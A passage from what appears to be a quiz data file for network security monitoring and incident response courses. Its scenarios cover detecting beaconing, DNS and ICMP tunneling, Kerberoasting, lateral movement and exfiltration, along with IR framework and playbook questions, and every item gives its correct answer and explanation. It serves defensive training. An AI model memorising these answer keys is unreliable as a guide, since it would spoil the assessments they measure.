          "Add workers / distribute across cores using AF_PACKET fanout or PF_RING with symmetric hashing, ensure NUMA-local pinning, and verify manager/proxy sizing",
          "Disable logging",
          "Reduce log retention"
        ],
        correctAnswer: 1,
        explanation: "capture_loss.log is Zeek telling you the capture plane is overwhelmed. The right response is horizontal scaling of workers with proper flow-based load balancing and NUMA pinning."
      },
      {
        id: "nsm-q4-10",
        difficulty: "medium",
        tags: ["Zeek vs Suricata"],
        scenario: "A colleague argues Zeek and Suricata are redundant.",
        question: "Which framing best captures why mature SOCs run both?",
        options: [
          "Suricata is deprecated",
          "Zeek produces rich stateful protocol metadata (hunt & context); Suricata is a high-performance signature engine (known-bad detection). They complement — one gives investigability, the other gives real-time hits.",
          "Zeek is only for research",
          "They're identical, pick either"
        ],
        correctAnswer: 1,
        explanation: "The tools solve different problems: Zeek = protocol-aware metadata & scripting (analyst power tool); Suricata = signature/heuristic real-time detection & IPS. Running both is the standard NSM pattern."
      }
    ]
  },
  {
    quizId: "nsm-q5",
    courseId: "network-security-monitoring",
    title: "Network Attack Detection",
    description: "Detecting recon, C2, lateral movement, and exfiltration from network telemetry.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "nsm-q5-1",
        difficulty: "easy",
        tags: ["Recon", "Scanning"],
        scenario: "conn.log entries: one source IP, 10,000 destinations in /16, port 445, duration<0.1s, conn_state='S0' (SYN sent, no reply).",
        question: "Which activity does this describe?",
        options: [
          "Legitimate backup",
          "TCP SYN sweep (half-open scan) for SMB — S0 with tiny duration across many destinations on a single port",
          "DNS query flood",
          "Kerberos golden ticket"
        ],
        correctAnswer: 1,
        explanation: "'S0' means SYN was sent but no response was recorded; combined with wide destination fan-out on one port, this is the classic Zeek fingerprint of a SYN sweep."
      },
      {
        id: "nsm-q5-2",
        difficulty: "medium",
        tags: ["C2", "Beaconing"],
        scenario: "A host connects to a single external IP every 300±5 seconds for 4 hours, ~2 KB up / 300 B down each time, TLS with a self-signed cert.",
        question: "Which detection technique most directly identifies this?",
        options: [
          "Signature match on payload",
          "Time-series periodicity analysis (jitter-tolerant interval detection) on conn.log/ssl.log, weighted by rare destination and self-signed cert",
          "Kerberos audit",
          "USB device inventory"
        ],
        correctAnswer: 1,
        explanation: "Beacon hunting relies on statistical periodicity of connection intervals (with tolerance for jitter), fused with metadata weakness signals (self-signed cert, rare destination, small symmetric payloads)."
      },
      {
        id: "nsm-q5-3",
        difficulty: "medium",
        tags: ["Lateral Movement", "SMB"],
        scenario: "Zeek smb_files.log shows a single account writing 'psexecsvc.exe' to ADMIN$ shares on 12 different hosts within 10 minutes, followed by service-related SMB activity.",
        question: "What is this?",
        options: [
          "Software patching",
          "Lateral movement using PsExec-style remote service execution (T1021.002 / T1569.002) — high-confidence detection candidate",
          "Backup job",
          "Kerberos delegation"
        ],
        correctAnswer: 1,
        explanation: "Writing a service binary to ADMIN$ then service creation on many hosts by one account is textbook PsExec-style lateral movement — MITRE T1021.002 / T1569.002."
      },
      {
        id: "nsm-q5-4",
        difficulty: "medium",
        tags: ["Exfiltration"],
        scenario: "A workstation uploads 12 GB over HTTPS to a newly registered domain (<7 days) in a rare ASN between 02:00-04:00 local time.",
        question: "Which detection composition is strongest?",
        options: [
          "Single-signal alert on byte count",
          "Composite score: large upload + rare/new domain + rare ASN + off-hours + user role baseline deviation — reduces FPs and prioritizes triage",
          "Ignore since it's TLS",
          "Block all HTTPS"
        ],
        correctAnswer: 1,
        explanation: "Any single signal (bytes, new domain, off-hours) alone produces noise. Composite scoring across independent weak signals yields high-precision exfiltration alerts."
      },
      {
        id: "nsm-q5-5",
        difficulty: "medium",
        tags: ["DNS Tunneling"],
        scenario: "dns.log for a host shows: 6,000 TXT queries in 5 minutes, avg subdomain length 55 chars, high Shannon entropy per label, all under one parent domain.",
        question: "Which conclusion is most defensible?",
        options: [
          "Legitimate SPF lookups",
          "DNS tunneling (likely TXT-based C2 or exfil) — high volume + long high-entropy labels + single parent domain",
          "NTP sync",
          "Windows Update"
        ],
        correctAnswer: 1,
        explanation: "TXT queries are attacker-friendly for encoding data. High volume, long high-entropy labels, and single parent domain is the DNS tunneling fingerprint (iodine/dnscat2/CS DNS beacon)."
      },
      {
        id: "nsm-q5-6",
        difficulty: "hard",
        tags: ["Kerberoasting"],
        scenario: "You see repeated Kerberos TGS-REP responses with etype=23 (RC4-HMAC) requested by one workstation for many SPNs across the domain.",
        question: "What is this behavior?",
        options: [
          "Normal domain login",
          "Kerberoasting (T1558.003) — attacker requests service tickets with RC4 to crack offline for service-account passwords",
          "DHCP renewal",
          "Certificate enrollment"
        ],
        correctAnswer: 1,
        explanation: "RC4 TGS requests are attacker-preferred because they are crackable offline. A workstation fetching many SPN tickets is the Kerberoasting fingerprint."
      },
      {
        id: "nsm-q5-7",
        difficulty: "hard",
        tags: ["ICMP Tunnel"],
        scenario: "One host sends 8,000 ICMP echo requests to a single external IP over 30 min, average payload 1400 bytes (max), highly variable content.",
        question: "Which conclusion is best?",
        options: [
          "Ping is always benign",
          "Likely ICMP tunneling / exfil (ptunnel/icmptx) — large variable payloads and sustained volume in echo requests are abnormal",
          "TCP retransmission",
          "DHCP"
        ],
        correctAnswer: 1,
        explanation: "Legitimate ping uses small, uniform payloads. Sustained, large, variable-content echo requests indicate data being smuggled inside ICMP payloads."
      },
      {
        id: "nsm-q5-8",
        difficulty: "hard",
        tags: ["TLS C2", "JA3"],
        scenario: "Two internal hosts contact different external IPs but share the identical JA3='72a589da586844d7f0818ce684948eea' and destination cert CN='localhost'.",
        question: "What is the strongest hypothesis?",
        options: [
          "Coincidence",
          "Same C2 framework/beacon (matching TLS stack + self-signed default cert) on two compromised hosts — pivot immediately for scoping",
          "Both are Chrome",
          "Both are Windows Update"
        ],
        correctAnswer: 1,
        explanation: "Matching JA3 + identical suspicious default cert across hosts points to the same tooling/binary. Treat as a scoping event — hunt other hosts with that JA3 or destination pattern."
      },
      {
        id: "nsm-q5-9",
        difficulty: "hard",
        tags: ["Exfil", "Cloud"],
        scenario: "A user uploads 8 GB to a personal drive.google.com endpoint from a corporate workstation over TLS.",
        question: "Which NSM signal(s) are usable given the TLS?",
        options: [
          "None — TLS makes it invisible",
          "SNI = drive.google.com + total responder/originator bytes + destination reputation category (personal cloud) + user baseline — sufficient to trigger a DLP/policy review even without payload",
          "Only PCAP would help",
          "IPS drops it automatically"
        ],
        correctAnswer: 1,
        explanation: "SNI and byte counts remain visible in TLS 1.2/1.3 (pre-ECH), and destination categorization plus baseline deviation are enough for high-fidelity DLP triage without touching payload."
      },
      {
        id: "nsm-q5-10",
        difficulty: "medium",
        tags: ["ATT&CK Mapping"],
        scenario: "During a case you have: SYN sweep → SMB write of service binary → new TLS beacon with self-signed cert → 12 GB HTTPS upload.",
        question: "Which ATT&CK mapping best summarizes the chain?",
        options: [
          "T1071 only",
          "Discovery (T1046) → Lateral Movement (T1021.002/T1569.002) → C2 (T1071.001 / T1573) → Exfiltration Over C2 or Web (T1041 / T1567)",
          "T1078 only",
          "T1499"
        ],
        correctAnswer: 1,
        explanation: "Sweep = Network Service Scanning; SMB service binary = Remote Services/System Services; beacon = Application Layer Protocol + Encrypted Channel; large upload = Exfiltration Over C2 or Web Service."
      }
    ]
  },
  {
    quizId: "nsm-q6",
    courseId: "network-security-monitoring",
    title: "Practical NSM Operations",
    description: "End-to-end NSM workflows, forensics, and program-level tradecraft.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "nsm-q6-1",
        difficulty: "easy",
        tags: ["Architecture", "SIEM"],
        scenario: "You are integrating Zeek and Suricata into a central SIEM across 5 sites.",
        question: "Which architecture is recommended?",
        options: [
          "Run Zeek and Suricata on the SIEM server itself",
          "Deploy on distributed sensors near the traffic; ship structured logs (eve.json / Zeek JSON) via Filebeat/Kafka to the SIEM for correlation",
          "Manually copy pcaps daily",
          "Only send alerts, discard metadata"
        ],
        correctAnswer: 1,
        explanation: "Sensors live at the data; the SIEM correlates. Log shipping via Filebeat/Kafka is the standard, resilient path — preserving Zeek and Suricata metadata for detection engineering and IR."
      },
      {
        id: "nsm-q6-2",
        difficulty: "easy",
        tags: ["Retention"],
        scenario: "Your regulator requires 1 year of network event retention; storage is finite.",
        question: "Which retention tiering is most practical?",
        options: [
          "1 year of full PCAP for everything",
          "Alerts + Zeek metadata for 12 months (hot/warm/cold), targeted full PCAP for 7-30 days at critical chokepoints",
          "Delete everything monthly",
          "PCAP only, no metadata"
        ],
        correctAnswer: 1,
        explanation: "Tiered retention matches cost to value: long-term metadata for investigability & compliance, short-term PCAP for deep-dive at critical points. Full-year PCAP is rarely economical."
      },
      {
        id: "nsm-q6-3",
        difficulty: "medium",
        tags: ["IR", "Scoping"],
        scenario: "An EDR alert names host WKS-042 as beaconing. You must scope how many other hosts talked to the same C2.",
        question: "Which NSM pivot is fastest?",
        options: [
          "Interview users",
          "Query Zeek conn.log/ssl.log for all internal sources connecting to the C2 IP/domain/JA3/cert fingerprint over the relevant window",
          "Reboot every workstation",
          "Wait for more EDR alerts"
        ],
        correctAnswer: 1,
        explanation: "NSM's central IR use is scoping: one query across Zeek metadata reveals every host that touched the C2 by IP, domain, JA3, or cert — vastly faster than endpoint-by-endpoint checks."
      },
      {
        id: "nsm-q6-4",
        difficulty: "medium",
        tags: ["Detection Engineering"],
        scenario: "A hunt discovered a new C2 pattern. You want it to become a durable detection.",
        question: "What is the correct handoff?",
        options: [
          "Post it in chat and hope",
          "Formalize into a Sigma/Suricata/Zeek rule in source control, add unit tests / replay pcaps, peer review, deploy via CI, track FP/TP over time",
          "Only email one person",
          "Delete the hunt notes"
        ],
        correctAnswer: 1,
        explanation: "Ad-hoc hunts must graduate into version-controlled, tested, peer-reviewed detections with measurable outcomes. This is the discipline that separates mature SOCs from alert-driven ones."
      },
      {
        id: "nsm-q6-5",
        difficulty: "medium",
        tags: ["Alert Tuning"],
        scenario: "Your Suricata alert queue averages 4,000 alerts/day; analysts triage <5%.",
        question: "What is the highest-leverage program action?",
        options: [
          "Hire more analysts",
          "Run alert triage analytics (top noisy rules, top sources, false-positive %), then suppress/threshold/rewrite the top 20 offenders and enforce SLA-based tuning ownership",
          "Ignore all alerts",
          "Disable Suricata"
        ],
        correctAnswer: 1,
        explanation: "80/20 always applies: a small number of rules and sources produce most of the noise. Focused, measured tuning with owned SLAs is the fastest path to a workable queue."
      },
      {
        id: "nsm-q6-6",
        difficulty: "medium",
        tags: ["Forensics", "Timeline"],
        scenario: "During an incident you must reconstruct a session-level timeline (who talked to whom, when, over which protocols, how many bytes).",
        question: "Which log is the primary spine?",
        options: [
          "Wireshark packet list",
          "Zeek conn.log (with pivots into http/ssl/dns/files by UID) — the canonical session ledger for NSM",
          "Firewall config",
          "AV logs"
        ],
        correctAnswer: 1,
        explanation: "conn.log is one row per session with timing, byte counts, state, and the UID that ties all other protocol logs together — the natural spine of any network timeline."
      },
      {
        id: "nsm-q6-7",
        difficulty: "hard",
        tags: ["Purple Team"],
        scenario: "Red team simulates a Cobalt Strike HTTPS beacon with a custom malleable C2 profile. Detection misses.",
        question: "Which purple-team output most improves NSM going forward?",
        options: [
          "'Try harder' feedback",
          "Capture PCAP of the exercise, extract JA3/JA3S, URI patterns, cert fingerprints, and beacon cadence; encode as Zeek/Suricata detections and add to CI replay tests",
          "Delete the pcap",
          "Ban red team"
        ],
        correctAnswer: 1,
        explanation: "Purple-team value is convertible artifacts: PCAPs, IOCs, and behavioral fingerprints that become tested, source-controlled detections — closing the loop from adversary emulation to durable coverage."
      },
      {
        id: "nsm-q6-8",
        difficulty: "hard",
        tags: ["Metrics", "Program"],
        scenario: "Leadership asks for meaningful NSM program metrics beyond 'alerts per day'.",
        question: "Which metric set is most defensible?",
        options: [
          "Alerts/day only",
          "Detection coverage vs. ATT&CK, MTTD/MTTR for network-origin incidents, precision (TP rate) per rule, sensor health (drop rate, capture loss), and hunt-to-detection conversion",
          "Number of rules total",
          "Uptime of SIEM only"
        ],
        correctAnswer: 1,
        explanation: "Mature NSM programs report on coverage (ATT&CK), effectiveness (MTTD/MTTR, precision), health (drops, loss), and engineering output (hunts becoming durable detections)."
      },
      {
        id: "nsm-q6-9",
        difficulty: "hard",
        tags: ["Encrypted DNS", "DoH"],
        scenario: "Endpoints have started using DNS-over-HTTPS (DoH) to public resolvers, bypassing your recursive resolver logs.",
        question: "Which control best restores DNS visibility?",
        options: [
          "Ignore DNS entirely now",
          "Enterprise policy to disable browser/OS DoH or force it through an internal DoH resolver; block known DoH providers at egress; monitor TLS SNI/JA3 to public DoH endpoints",
          "Block all HTTPS",
          "Trust the endpoint"
        ],
        correctAnswer: 1,
        explanation: "DoH breaks passive resolver telemetry. Restore visibility by policy (disable/redirect DoH), egress controls to known DoH endpoints, and TLS metadata monitoring for attempted bypass."
      },
      {
        id: "nsm-q6-10",
        difficulty: "medium",
        tags: ["Program Maturity"],
        scenario: "You're building a 12-month NSM roadmap. Rank the highest-leverage foundational investment.",
        question: "Which comes first?",
        options: [
          "Buy the most expensive commercial IPS",
          "Get reliable, complete capture (TAPs, packet broker, no drops) and normalized Zeek+Suricata metadata into the SIEM — no detection matters without trustworthy telemetry",
          "Hire more junior analysts first",
          "Publish a marketing blog"
        ],
        correctAnswer: 1,
        explanation: "Detection engineering, hunting, and IR all rest on telemetry integrity. Fixing capture and pipeline hygiene first pays compounding dividends on every downstream investment."
      }
    ]
  },
  {
      quizId: "ir-q1",
      courseId: "incident-response",
      title: "IR Foundations & Frameworks",
      description: "Scenario-based assessment of NIST SP 800-61r2, SANS PICERL, and IR team structures under real-world pressure.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q1-1",
              difficulty: "easy",
              tags: [
                  "NIST",
                  "Event vs Incident"
              ],
              scenario: "At 02:14 UTC your SIEM fires: 'EventID 4625 x38 for svc_backup from 10.14.3.9 in 90s'. The account is not locked out, no data has moved, and no policy has been violated yet.",
              question: "Under NIST SP 800-61r2, is this an event or an incident, and why?",
              options: [
                  "Incident — any authentication failure is a policy violation",
                  "Event — an observable occurrence; it becomes an incident only when it violates or imminently threatens a security policy",
                  "Incident — service accounts must never fail authentication",
                  "Event — because it happened outside business hours"
              ],
              correctAnswer: 1,
              explanation: "NIST defines an event as any observable occurrence. It escalates to an incident when it violates (or imminently threatens) confidentiality, integrity, availability, AUP, or standard practices. Failed logins alone are events until context (e.g., password spray, later success) crosses that line."
          },
          {
              id: "ir-q1-2",
              difficulty: "easy",
              tags: [
                  "NIST Lifecycle"
              ],
              scenario: "A junior analyst confirms ransomware on a file server, immediately reimages it, then asks what to do next.",
              question: "Which NIST phase did the analyst skip, and what is the consequence?",
              options: [
                  "Skipped Preparation — no impact on this case",
                  "Skipped Containment & evidence collection — root cause, scope, and lateral movement can no longer be reconstructed",
                  "Skipped Recovery — the server should have stayed offline longer",
                  "Skipped Lessons Learned — only affects reporting"
              ],
              correctAnswer: 1,
              explanation: "NIST places Containment/Eradication/Recovery after evidence-preserving analysis. Reimaging before triage destroys memory, event logs, and artifacts needed to identify patient zero and the blast radius, guaranteeing re-compromise via the same vector."
          },
          {
              id: "ir-q1-3",
              difficulty: "medium",
              tags: [
                  "SANS PICERL",
                  "Containment"
              ],
              scenario: "A crypto-miner is beaconing from 47 Linux hosts across three subnets. Business asks: 'Just block the C2 IP at the firewall — done, right?'",
              question: "How does SANS PICERL distinguish short-term vs long-term containment here?",
              options: [
                  "Short-term = block C2 IP to stop bleeding; long-term = patch the exploited service, rotate keys, harden images, then rebuild",
                  "Short-term and long-term are the same action performed twice",
                  "Long-term containment means leaving the malware running to study it",
                  "Short-term containment means notifying customers"
              ],
              correctAnswer: 0,
              explanation: "Short-term containment stops active harm quickly (block IP, isolate VLAN). Long-term containment applies durable fixes (patch, credential rotation, golden image) so eradication and recovery don't just restore the vulnerable state."
          },
          {
              id: "ir-q1-4",
              difficulty: "medium",
              tags: [
                  "Team Structure",
                  "CSIRT"
              ],
              scenario: "Your 24x7 SOC triages alerts but every confirmed intrusion is handed off to a small forensics team that also builds detections and negotiates with legal.",
              question: "Which structural weakness will surface first under a major incident?",
              options: [
                  "Nothing — this is the recommended NIST model",
                  "Role conflict and burnout: the same team cannot simultaneously respond, engineer detections, and manage legal/comms at incident tempo",
                  "SOC analysts should also negotiate with legal",
                  "Forensics teams should own tier-1 triage"
              ],
              correctAnswer: 1,
              explanation: "Mature IR separates responders, detection engineers, forensic/malware analysts, and comms/legal liaisons. Overloading one team creates decision bottlenecks, evidence errors, and analyst attrition — the #1 predictor of blown SLAs during real incidents."
          },
          {
              id: "ir-q1-5",
              difficulty: "medium",
              tags: [
                  "RACI",
                  "Decision Rights"
              ],
              scenario: "During an active ransomware event, the CISO, IT Director, and General Counsel each issue conflicting containment orders in Slack within 10 minutes.",
              question: "Which artifact prevents this failure mode?",
              options: [
                  "A larger Slack channel",
                  "A pre-approved RACI matrix + declared Incident Commander with unambiguous decision authority",
                  "More SIEM dashboards",
                  "A press release template"
              ],
              correctAnswer: 1,
              explanation: "IR needs a single Incident Commander with pre-authorized decision rights, backed by a RACI. Without it, tempo collapses into consensus-seeking during the exact minutes attackers exploit. This is why NIST 'Preparation' includes governance, not just tooling."
          },
          {
              id: "ir-q1-6",
              difficulty: "medium",
              tags: [
                  "Preparation",
                  "Jump Kit"
              ],
              scenario: "Your responder arrives on-site and finds the compromised network is fully segmented from the internet. They cannot download tools.",
              question: "Which Preparation-phase item would have prevented this delay?",
              options: [
                  "A written IR policy",
                  "An offline, versioned jump kit (write-blocker, imager, trusted binaries, sysinternals, memory acquisition, known-good OS) on removable media",
                  "A larger SIEM license",
                  "A vendor MSSP contract"
              ],
              correctAnswer: 1,
              explanation: "Jump kits are a Preparation deliverable: pre-vetted, offline tools + trusted binaries so responders operate in hostile/air-gapped networks without introducing supply-chain risk or waiting on procurement."
          },
          {
              id: "ir-q1-7",
              difficulty: "hard",
              tags: [
                  "Chain of Custody",
                  "Legal"
              ],
              scenario: "An analyst copies suspicious files off the victim host with SMB drag-and-drop, emails them to a colleague, and later legal asks whether these can be used in court.",
              question: "What is the most defensible answer?",
              options: [
                  "Yes — copies are always admissible",
                  "Likely no — no write-blocker, no hash-verified image, no documented chain of custody; evidentiary weight is severely degraded",
                  "Yes — as long as antivirus scanned them",
                  "No — digital evidence is never admissible"
              ],
              correctAnswer: 1,
              explanation: "Legally usable evidence requires forensically sound acquisition (write-blocked or verified imaging), cryptographic hashing before/after, and an unbroken chain of custody log (who/when/why/where). Casual SMB copies break all three."
          },
          {
              id: "ir-q1-8",
              difficulty: "hard",
              tags: [
                  "Severity Classification"
              ],
              scenario: "Same malware family detonates on: (A) an isolated marketing laptop, (B) a domain controller, (C) a PCI cardholder-data segment host.",
              question: "Under a standard severity model, why do these get different severities despite identical malware?",
              options: [
                  "They shouldn't — malware family sets severity",
                  "Severity is business-impact driven: asset criticality, data classification, and blast radius dominate — not the malware family",
                  "The DC is always the lowest because it's well-monitored",
                  "PCI hosts are always lowest severity"
              ],
              correctAnswer: 1,
              explanation: "Severity models (e.g., FIRST CVSS-BT, internal tiers) weight asset criticality, data sensitivity (PCI/PHI/PII), lateral pivot potential, and recoverability. Identical TTPs on a DC or PCI host imply enterprise-wide compromise or regulated breach exposure — not comparable to a standalone laptop."
          },
          {
              id: "ir-q1-9",
              difficulty: "hard",
              tags: [
                  "Third Parties",
                  "MSSP"
              ],
              scenario: "Your MSSP detects the alert but escalates 47 minutes late because their SLA is 'best effort during business hours' and the incident began at 03:00.",
              question: "Which Preparation gap does this expose?",
              options: [
                  "None — MSSPs are always best-effort",
                  "Contractual: SLAs, escalation trees, on-call rosters, and joint runbooks were never tested end-to-end at 3am",
                  "Technical: the SIEM was misconfigured",
                  "Legal: no press release template existed"
              ],
              correctAnswer: 1,
              explanation: "Preparation includes vendor governance: measurable SLAs, 24x7 escalation trees, quarterly tabletop with the MSSP, and joint runbooks. Untested contracts are the single most common cause of late external escalations."
          },
          {
              id: "ir-q1-10",
              difficulty: "hard",
              tags: [
                  "Framework Comparison"
              ],
              scenario: "Leadership asks: 'Should we adopt NIST 800-61r2 or SANS PICERL as our IR framework?'",
              question: "What is the most accurate answer?",
              options: [
                  "NIST — it is legally required",
                  "SANS — because it has 6 phases instead of 4",
                  "Either — they are conceptually equivalent (Prep / Detect+Analyze / Contain-Eradicate-Recover / Post-Incident); pick one, tailor playbooks, and be consistent",
                  "Neither — build your own from scratch"
              ],
              correctAnswer: 2,
              explanation: "NIST's 4 phases and SANS's 6 phases (PICERL) cover the same lifecycle at different granularities. Regulators care that you follow *a* recognized framework consistently and can evidence it — not which one."
          }
      ]
  },
  {
      quizId: "ir-q2",
      courseId: "incident-response",
      title: "IR Policy, Plans & Playbooks",
      description: "Scenario-based questions on the policy/plan/playbook hierarchy, communications, legal holds, and playbook design.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q2-1",
              difficulty: "easy",
              tags: [
                  "Policy vs Plan vs Playbook"
              ],
              scenario: "Your auditor finds three documents: (1) a 2-page executive charter granting the CSIRT authority to disconnect any asset, (2) a 40-page IR plan describing lifecycle, roles, and metrics, (3) a 6-page ransomware runbook with exact commands.",
              question: "Map each to Policy / Plan / Playbook.",
              options: [
                  "1=Playbook, 2=Policy, 3=Plan",
                  "1=Policy, 2=Plan, 3=Playbook",
                  "1=Plan, 2=Playbook, 3=Policy",
                  "All three are policies"
              ],
              correctAnswer: 1,
              explanation: "Policy grants authority and sets intent (short, exec-signed). Plan operationalizes policy (roles, lifecycle, metrics). Playbooks are scenario-specific step-by-step procedures. Each layer changes at a different cadence and needs different reviewers."
          },
          {
              id: "ir-q2-2",
              difficulty: "easy",
              tags: [
                  "Playbook Design"
              ],
              scenario: "Your ransomware playbook reads: 'The analyst should investigate the affected system and take appropriate action.'",
              question: "What is wrong with this instruction?",
              options: [
                  "Nothing — analysts need flexibility",
                  "It is not a playbook step — no decision criteria, owner, action, tool, or expected artifact; it cannot be executed under pressure",
                  "It should be in the policy instead",
                  "It should be longer"
              ],
              correctAnswer: 1,
              explanation: "Effective playbook steps are executable: trigger, decision criteria, actor role, exact command/tool, expected output, and next-step branch. Vague prose collapses at 3am when the on-call has 90 seconds to act."
          },
          {
              id: "ir-q2-3",
              difficulty: "medium",
              tags: [
                  "Communications Plan"
              ],
              scenario: "Mid-incident, an engineer posts screenshots of attacker C2 traffic in the company-wide #general Slack channel.",
              question: "Which control should have prevented this?",
              options: [
                  "A ban on Slack",
                  "A pre-defined communications plan: dedicated out-of-band incident channel, named spokespeople, and a 'need-to-know' rule",
                  "A stricter firewall",
                  "Nothing — transparency is good"
              ],
              correctAnswer: 1,
              explanation: "IR comms plans define who talks, where, and to whom. Attackers monitor Slack/Teams after credential theft; leaked TTPs let them pivot, wipe, or accelerate. Out-of-band, need-to-know channels are non-negotiable."
          },
          {
              id: "ir-q2-4",
              difficulty: "medium",
              tags: [
                  "Out-of-Band"
              ],
              scenario: "During an AD compromise the team coordinates in Microsoft Teams — which uses the same compromised AD for auth.",
              question: "Why is this a critical mistake?",
              options: [
                  "It isn't — Teams is encrypted",
                  "The attacker with AD control can read, join, or lock the response channel; comms must move to an out-of-band, independently-authenticated channel (e.g., Signal, phone bridge)",
                  "Teams is too slow",
                  "It violates GDPR"
              ],
              correctAnswer: 1,
              explanation: "If the attacker owns the auth plane (AD, IdP, SSO), any tool that trusts it is compromised. Every mature IR plan pre-provisions an out-of-band bridge (Signal group, PSTN conference, standalone accounts) with printed contact rosters."
          },
          {
              id: "ir-q2-5",
              difficulty: "medium",
              tags: [
                  "Legal Hold"
              ],
              scenario: "Two days into a suspected insider data-theft case, an admin runs the scheduled 30-day log rotation and wipes proxy/DNS logs for the suspect window.",
              question: "Which Preparation-phase control failed?",
              options: [
                  "Backups",
                  "Legal-hold / preservation procedure — once litigation is reasonably anticipated, routine deletion must be suspended for relevant custodians and systems",
                  "Firewall rules",
                  "MFA"
              ],
              correctAnswer: 1,
              explanation: "Legal hold (litigation hold) is a documented procedure to freeze retention on relevant data the moment an incident with legal exposure is identified. Its absence can lead to spoliation sanctions and destroys the case."
          },
          {
              id: "ir-q2-6",
              difficulty: "medium",
              tags: [
                  "Tabletop Exercises"
              ],
              scenario: "You've had an IR plan for 3 years. You've never run a tabletop.",
              question: "What is the most likely first failure in a real event?",
              options: [
                  "SIEM crashes",
                  "Coordination failure — unknown escalation paths, missing phone numbers, unclear authority, untested vendor SLAs",
                  "The malware is undetected",
                  "The firewall fails open"
              ],
              correctAnswer: 1,
              explanation: "Post-incident reviews consistently show the first casualty of unexercised plans is coordination, not tooling. Tabletops surface stale contacts, ambiguous authority, and missing playbook branches before an adversary does."
          },
          {
              id: "ir-q2-7",
              difficulty: "hard",
              tags: [
                  "Playbook Structure"
              ],
              scenario: "You're designing a phishing playbook. Which structure best supports on-call analysts?",
              question: "Pick the strongest design.",
              options: [
                  "One monolithic 40-page document",
                  "Trigger → Triage (inputs, decision tree) → Containment (exact actions per system) → Eradication → Recovery → Comms → Evidence checklist → Metrics — all fitting on printable cards",
                  "A single decision tree with no actions",
                  "A policy statement only"
              ],
              correctAnswer: 1,
              explanation: "Executable playbooks are structured around the lifecycle with explicit inputs/outputs at each stage, embedded decision criteria, and pre-authored artifacts (comms templates, evidence checklists). Printable/segmentable so they survive tool outages."
          },
          {
              id: "ir-q2-8",
              difficulty: "hard",
              tags: [
                  "Authority",
                  "Kill Switch"
              ],
              scenario: "Ransomware is spreading. The on-call analyst wants to null-route the affected /24, but nobody knows who can authorize it at 03:00.",
              question: "Which policy element is missing?",
              options: [
                  "A stricter password policy",
                  "Pre-authorized emergency actions ('break-glass') delegated in policy to the on-call IC — with defined guardrails and post-hoc review",
                  "A new SIEM",
                  "A patch policy"
              ],
              correctAnswer: 1,
              explanation: "Mature IR policies pre-authorize specific containment actions (isolate host, block IP range, disable account) to named roles under defined conditions, with mandatory post-action review. Otherwise every incident stalls waiting for a VP callback."
          },
          {
              id: "ir-q2-9",
              difficulty: "hard",
              tags: [
                  "Regulatory Notification"
              ],
              scenario: "You confirm exfiltration of EU customer PII at 09:00 Monday. Legal asks how quickly you must notify.",
              question: "What does GDPR Article 33 require, and what does the plan need to support it?",
              options: [
                  "30 days — no plan needed",
                  "Without undue delay and within 72 hours of becoming aware — the plan must define 'awareness', evidence timestamps, decision authority, and DPA contact procedure",
                  "24 hours — via press release",
                  "Only if fine is likely"
              ],
              correctAnswer: 1,
              explanation: "GDPR Art. 33 mandates supervisory-authority notification within 72 hours of awareness (unless unlikely to risk rights/freedoms). The IR plan must define 'awareness', maintain evidentiary timestamps, and pre-identify the DPA notification path — this is a Preparation deliverable."
          },
          {
              id: "ir-q2-10",
              difficulty: "hard",
              tags: [
                  "Playbook Lifecycle"
              ],
              scenario: "Your ransomware playbook still references a decommissioned EDR product.",
              question: "Which governance control is missing?",
              options: [
                  "Larger playbook",
                  "Versioning + a scheduled review cadence (e.g., quarterly + after every incident + after tool changes) with an owner",
                  "More screenshots",
                  "Executive signature"
              ],
              correctAnswer: 1,
              explanation: "Playbooks decay faster than any other IR artifact because tools, teams, and threats change monthly. Governance requires named owners, versioning, and a triggered-review policy (change control, post-incident, threat evolution) — otherwise responders execute fiction."
          }
      ]
  },
  {
      quizId: "ir-q3",
      courseId: "incident-response",
      title: "Detection & Initial Triage",
      description: "Scenario-based triage: separating signal from noise, prioritization, and first-hour analyst decisions.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q3-1",
              difficulty: "easy",
              tags: [
                  "Triage",
                  "Prioritization"
              ],
              scenario: "Queue at 09:00: (A) EDR: 'mimikatz.exe' string on DC01, (B) 12,000 failed logins for one user in 5m, (C) proxy: 400MB upload from finance host to unknown domain, (D) AV cleaned an EICAR test file.",
              question: "Which do you triage first and why?",
              options: [
                  "D — recent AV activity",
                  "A — credential theft tooling on a Tier-0 asset (DC) is highest blast radius",
                  "B — brute force is always critical",
                  "C — data always matters most"
              ],
              correctAnswer: 1,
              explanation: "Prioritization is (impact × likelihood). Credential-theft tooling on a domain controller implies potential enterprise-wide compromise via Kerberos/DCSync — dwarfs a brute force (mitigated by lockout) or a single exfil alert that will still be there in 10 minutes."
          },
          {
              id: "ir-q3-2",
              difficulty: "easy",
              tags: [
                  "Signal vs Noise"
              ],
              scenario: "A rule alerts on every PowerShell execution. You get 4,000 hits/day and confirmed incidents are missed in the queue.",
              question: "Which detection principle is violated?",
              options: [
                  "None — more alerts is safer",
                  "Precision — high-volume/low-precision detections cause alert fatigue and mask true positives; refine with parent process, command-line, user context, or convert to hunt telemetry",
                  "Recall — the rule should fire more",
                  "Encryption — logs should be encrypted"
              ],
              correctAnswer: 1,
              explanation: "Detection quality is measured by precision (TP / (TP+FP)) and recall. High-recall/low-precision rules become noise. Tighten with context (unusual parent, encoded/obfuscated, off-hours, non-admin user) or downgrade to hunting telemetry."
          },
          {
              id: "ir-q3-3",
              difficulty: "medium",
              tags: [
                  "Alert Enrichment"
              ],
              scenario: "You receive: 'EDR: suspicious PowerShell on WKS-4471 by user jsmith at 14:02 UTC'. Nothing else.",
              question: "What enrichment do you fetch before deciding?",
              options: [
                  "Only the raw command line",
                  "Parent/grandparent process, full decoded command line, user role/asset criticality, geo/VPN of session, recent auth for user, prior similar alerts, hash reputation, related network events in ±10m",
                  "Just the hostname",
                  "Only the alert count"
              ],
              correctAnswer: 1,
              explanation: "Triage is enrichment-driven: process ancestry (WINWORD→POWERSHELL is very different from EXPLORER→POWERSHELL), decoded arguments, identity context, historical baseline, and correlated network activity turn a single string into a defensible verdict."
          },
          {
              id: "ir-q3-4",
              difficulty: "medium",
              tags: [
                  "True/False Positive"
              ],
